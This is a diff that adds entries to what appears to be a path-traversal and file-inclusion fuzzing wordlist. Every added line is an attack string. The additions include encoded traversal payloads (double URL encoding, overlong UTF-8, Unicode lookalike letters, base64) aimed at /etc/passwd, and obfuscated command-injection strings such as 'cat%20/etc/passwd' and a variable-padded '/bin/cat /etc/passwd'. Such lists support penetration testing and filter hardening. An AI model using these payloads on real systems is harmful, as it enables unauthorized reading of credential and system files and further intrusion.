@@ -1,3 +1,5 @@
+$aaaaaaa/bin$bbbbbb/cat$ccccccc
+$dddddddd/etc$eeeeeee/passwd$ggggggg
 %%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66boot.ini
 %%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66issue
 %%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
@@ -1590,6 +1592,7 @@
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini%00index.html
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini;index.html
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
@@ -1656,6 +1659,7 @@
 %252e%252e%252fboot.ini;index.html
 %252e%252e%252fetc%252fissue
 %252e%252e%252fetc%252fpasswd
+%252e%252e%252fetc%252fpasswd%00
 %252e%252e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
 %252e%252e%252f{FILE}
 %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd
@@ -3411,6 +3415,7 @@
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini%00index.html
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini;index.html
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c
@@ -5686,6 +5691,7 @@
 %5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
 %5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
 %5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
 %c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66boot.ini
 %c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66etc%%32%%66issue
 %c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66%c0%2e%c0%2e%%32%%66etc%%32%%66passwd
@@ -7859,6 +7865,7 @@
 %c0%ae%c0%ae%uF025etc%uF025issue
 %c0%ae%c0%ae%uF025etc%uF025passwd
 %c0%ae%c0%ae%uF025windows%uF025system32%uF025drivers%uF025etc%uF025hosts
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
 %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini
 %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
@@ -13825,6 +13832,7 @@
 %uff0e%uff0e\etc\passwd
 %uff0e%uff0e\windows\system32\drivers\etc\hosts
 %uff0e%uff0e\{FILE}
+\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd
 -/etc/pure-ftpd.conf
 .%00.%%32%%66.%00.%%32%%66.%00.%%32%%66.%00.%%32%%66.%00.%%32%%66.%00.%%32%%66boot.ini
 .%00.%%32%%66.%00.%%32%%66.%00.%%32%%66.%00.%%32%%66.%00.%%32%%66.%00.%%32%%66etc%%32%%66issue
@@ -16317,6 +16325,7 @@
 ..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
@@ -18787,6 +18796,10 @@
 ../../../../../../../../../../../../../../../../proc/self/environ%00
 ../../../../../../../../../../../../../../../../proc/self/fd/8
 ../../../../../../../../../../../../../../../../proc/self/fd/8%00
+../../../../../../../../../../../../../../../../ℯ𝐓Ⓒ/𝐩ⓐsswd
+../../../../../../../../../../../../../../../../ⅇⓉⒸ/🄿𝘼𝙎𝙎𝙒𝘿
+../../../../../../../../../../../../../../../../𝘌𝙏𝘾/𝙋𝘼𝙎𝙎𝙒𝘿
+../../../../../../../../../../../../../../../../🄴🅃🄲/🄿🄰🅂🅂🅆🄳
 ../../../../../../../../../../../../../../../apache/logs/access.log
 ../../../../../../../../../../../../../../../apache/logs/access.log%00
 ../../../../../../../../../../../../../../../apache/logs/error.log
@@ -19354,6 +19367,7 @@
 ..///..///etc///passwd
 ..///..///windows///system32///drivers///etc///hosts
 ..///..///{FILE}
+..///////..////..//////etc/passwd
 ..////etc/passwd
 ..///boot.ini
 ..///etc///issue
@@ -23013,6 +23027,7 @@
 /0x2e0x2e\0x2e0x2e\{FILE}
 /0x2e0x2e\boot.ini
 /0x2e0x2e\{FILE}
+/???/??t+/???/??ss??
 /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../
 /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../
 /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../
@@ -24106,6 +24121,7 @@
 /var/spool/logs
 /var/spool/tmp
 /var/webmin/miniserv.log
+/var/www/../../etc/passwd
 /var/www/.bash_history
 /var/www/conf/httpd.conf
 /var/www/conf/httpd.conf%00
@@ -26382,6 +26398,7 @@
 ??\etc\issue
 ??\etc\passwd
 ??\windows\system32\drivers\etc\hosts
+À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../..//etc/passwd
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../boot.ini
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../{FILE}
@@ -26889,6 +26906,8 @@ Li4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vZXRjL3Bhc3N3ZCUwMA==
 Li4vZXRjL3Bhc3N3ZA==
 Li4vZXRjL3Bhc3N3ZCUwMA==
+META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+META-INF/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd
 Statement
 ZXRjL3Bhc3N3ZA==
 ZXRjL3NoYWRvdyUwMA==
@@ -26952,6 +26971,7 @@ ZXRjL3NoYWRvdyUwMA==
 \Program Files\xampp\apache\conf\httpd.confetc/passwd
 \\&apos;/bin/cat%20/etc/passwd\\&apos;
 \\&apos;/bin/cat%20/etc/shadow\\&apos;
+\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd
 \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
 \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
 \\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
@@ -27105,6 +27125,11 @@ c:\php5\php.ini
 c:\php\php.ini
 c:\wamp\logs\access.log
 c:\xampp\apache\bin\php.ini
+cat%20/etc/passwd
+cat%20/ℯ𝐓Ⓒ/𝐩?sswd
+cat%20/ℯ𝙏𝘾/𝙋𝘼𝙎𝙎𝙒𝘿
+cat%20/🄴🅃🄲/🄿🄰🅂🅂🅆🄳
+cat%20/🄴🅃🄲/🅂?🄰🄳??
 config.asp
 config.inc.php
 config.js
@@ -27138,6 +27163,8 @@ proc/self/environ
 proc/self/environ%00
 root/.htpasswd
 user/.htpasswd
+user/local/../../../../../../../../../../../../../../../../../../../e't'c/p'a's's'w'd'
+user/local/../../../../../../../../../../../../../../../../../../../etc/passwd/../../../../../../../../../../../../../../../../../../../etc/passwd
 users.db.php
 users/.htpasswd
 web.config
